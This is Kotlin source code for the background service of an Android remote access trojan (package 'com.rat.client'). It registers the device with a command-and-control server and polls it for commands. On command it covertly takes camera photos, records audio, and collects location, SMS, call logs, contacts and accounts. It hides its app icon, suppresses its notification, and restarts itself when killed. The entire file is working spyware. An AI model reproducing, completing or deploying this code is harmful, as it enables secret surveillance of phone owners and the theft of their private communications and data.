package com.rat.client.services

import android.app.*
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.PowerManager
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.rat.client.Config
import com.rat.client.MainActivity
import com.rat.client.utils.*
import org.json.JSONArray
import org.json.JSONObject

/**
 * Foreground service that runs persistently in the background.
 * Handles:
 * - Device registration and heartbeats
 * - Command polling and execution
 * - All data collection
 * - App hide/unhide
 */
class BackgroundService : Service() {
    companion object {
        private const val TAG = "BackgroundService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "rat_service_channel"
        private const val REQUEST_CODE_SHOW = 1002

        private var isRunning = false

        fun startService(context: Context) {
            if (isRunning) {
                Log.d(TAG, "Service already running")
                return
            }

            try {
                val intent = Intent(context, BackgroundService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service: ${e.message}")
            }
        }

        fun stopService(context: Context) {
            try {
                context.stopService(Intent(context, BackgroundService::class.java))
            } catch (e: Exception) {
                Log.e(TAG, "Failed to stop service: ${e.message}")
            }
        }
    }

    private var isDestroyed = false
    private var deviceId: String? = null

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        isDestroyed = false
        Log.d(TAG, "Service created")

        createNotificationChannel()

        // Hide app icon if configured
        if (Config.HIDE_APP_ICON) {
            hideAppIcon()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "Service started")

        val notification = createNotification()
        startForeground(NOTIFICATION_ID, notification)

        // Start the main work in background threads
        Thread { performInitialRegistration() }.apply { name = "initial-registration" }.start()
        startHeartbeatLoop()
        startCommandPoller()

        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        isDestroyed = true
        Log.d(TAG, "Service destroyed")

        // Restart if killed
        if (!isDestroyed) {
            startService(this)
        }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        Log.d(TAG, "Task removed, restarting...")
        // Restart service
        startService(this)
    }

    /**
     * Register the device with the C2 server.
     */
    private fun performInitialRegistration() {
        try {
            val deviceId = DeviceInfoUtils.getDeviceId(this)
            this.deviceId = deviceId

            val payload = JSONObject()
            payload.put("deviceId", deviceId)
            payload.put("deviceName", DeviceInfoUtils.getDeviceName())
            payload.put("manufacturer", DeviceInfoUtils.getManufacturer())
            payload.put("model", DeviceInfoUtils.getModel())
            payload.put("androidVersion", DeviceInfoUtils.getAndroidVersion())
            payload.put("sdkVersion", DeviceInfoUtils.getSdkVersion())
            payload.put("batteryLevel", DeviceInfoUtils.getBatteryLevel(this))
            payload.put("isCharging", DeviceInfoUtils.isCharging(this))
            payload.put("networkType", DeviceInfoUtils.getNetworkType(this))
            payload.put("simInfo", DeviceInfoUtils.getSimInfo(this))
            payload.put("totalStorage", DeviceInfoUtils.getTotalStorage())
            payload.put("usedStorage", DeviceInfoUtils.getUsedStorage())

            val response = ApiClient.post(Config.Api.REGISTER, payload)

            if (response != null) {
                Log.d(TAG, "Device registered: $deviceId")

                // Process any pending commands from registration response
                if (response.has("pendingCommands")) {
                    val commands = response.getJSONArray("pendingCommands")
                    processCommands(commands)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Registration error: ${e.message}")
        }
    }

    /**
     * Send periodic heartbeats and check for new commands.
     */
    private fun startHeartbeatLoop() {
        Thread {
            while (!isDestroyed) {
                try {
                    Thread.sleep(Config.HEARTBEAT_INTERVAL_MS)

                    val deviceId = this.deviceId ?: continue
                    val payload = JSONObject()
                    payload.put("deviceId", deviceId)
                    payload.put("batteryLevel", DeviceInfoUtils.getBatteryLevel(this))
                    payload.put("isCharging", DeviceInfoUtils.isCharging(this))

                    val response = ApiClient.post(Config.Api.HEARTBEAT, payload)
                    if (response != null && response.has("pendingCommands")) {
                        val commands = response.getJSONArray("pendingCommands")
                        if (commands.length() > 0) {
                            processCommands(commands)
                        }
                    }
                } catch (e: InterruptedException) {
                    break
                } catch (e: Exception) {
                    Log.e(TAG, "Heartbeat error: ${e.message}")
                }
            }
        }.apply { name = "heartbeat-thread" }.start()
    }

    /**
     * Poll for new commands periodically.
     */
    private fun startCommandPoller() {
        Thread {
            while (!isDestroyed) {
                try {
                    Thread.sleep(15000) // Poll every 15 seconds

                    val deviceId = this.deviceId ?: continue
                    val payload = JSONObject()
                    payload.put("deviceId", deviceId)
                    payload.put("batteryLevel", DeviceInfoUtils.getBatteryLevel(this))
                    payload.put("isCharging", DeviceInfoUtils.isCharging(this))

                    val response = ApiClient.post(Config.Api.HEARTBEAT, payload)
                    if (response != null && response.has("pendingCommands")) {
                        val commands = response.getJSONArray("pendingCommands")
                        if (commands.length() > 0) {
                            processCommands(commands)
                        }
                    }
                } catch (e: InterruptedException) {
                    break
                } catch (e: Exception) {
                    // Silent fail
                }
            }
        }.apply { name = "command-poller" }.start()
    }

    /**
     * Process and execute commands received from the server.
     */
    private fun processCommands(commands: JSONArray) {
        for (i in 0 until commands.length()) {
            var cmd: JSONObject? = null
            try {
                cmd = commands.getJSONObject(i)
                val cmdId = cmd.optString("id", "")
                val cmdType = cmd.optString("type", "")
                val params = cmd.optJSONObject("params") ?: JSONObject()

                Log.d(TAG, "Processing command: $cmdType (id: $cmdId)")

                // Mark command as sent
                updateCommandStatus(cmdId, "sent")

                // Execute command
                when (cmdType) {
                    "capture_photo_front" -> CameraUtils.capturePhoto(this, true)
                    "capture_photo_back" -> CameraUtils.capturePhoto(this, false)
                    "record_audio" -> MicrophoneUtils.recordAudio(this)
                    "get_location" -> LocationUtils.getLocation(this)
                    "get_sms" -> SmsUtils.getAllSms(this)
                    "get_call_logs" -> CallLogUtils.getAllCallLogs(this)
                    "get_contacts" -> ContactUtils.getAllContacts(this)
                    "get_installed_apps" -> AppListUtils.getInstalledApps(this)
                    "get_accounts" -> AccountUtils.getAccounts(this)
                    "hide_app" -> hideAppIcon()
                    "unhide_app" -> unhideAppIcon()
                    "get_storage_info" -> {
                        // Storage info is sent with heartbeat
                    }
                }

                // Mark command as completed
                updateCommandStatus(cmdId, "completed")
            } catch (e: Exception) {
                Log.e(TAG, "Command execution error: ${e.message}")
                try {
                    updateCommandStatus(cmd?.optString("id", "") ?: "", "failed")
                } catch (_: Exception) {}
            }
        }
    }

    private fun updateCommandStatus(commandId: String, status: String) {
        if (commandId.isEmpty()) return
        try {
            val payload = JSONObject()
            payload.put("commandId", commandId)
            payload.put("status", status)
            ApiClient.post(Config.Api.COMMAND_STATUS, payload)
        } catch (e: Exception) {
            Log.e(TAG, "Status update error: ${e.message}")
        }
    }

    /**
     * Hide app icon from launcher.
     */
    private fun hideAppIcon() {
        try {
            val pm = packageManager
            pm.setComponentEnabledSetting(
                ComponentName(this, "${packageName}.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "App icon hidden")
        } catch (e: Exception) {
            Log.e(TAG, "Hide icon error: ${e.message}")
        }
    }

    /**
     * Unhide app icon.
     */
    private fun unhideAppIcon() {
        try {
            val pm = packageManager
            pm.setComponentEnabledSetting(
                ComponentName(this, "${packageName}.MainActivity"),
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.d(TAG, "App icon unhidden")
        } catch (e: Exception) {
            Log.e(TAG, "Unhide icon error: ${e.message}")
        }
    }

    /**
     * Create notification channel for foreground service.
     */
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                getString(com.rat.client.R.string.channel_name),
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = getString(com.rat.client.R.string.channel_description)
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
                enableLights(false)
                enableVibration(false)
            }

            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }

    /**
     * Create low-importance notification for persistent foreground service.
     */
    private fun createNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, REQUEST_CODE_SHOW, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(getString(com.rat.client.R.string.app_name))
            .setContentText(getString(com.rat.client.R.string.service_notification))
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setShowWhen(false)
            .setContentIntent(pendingIntent)
            .setSilent(true)
            .build()
    }
}



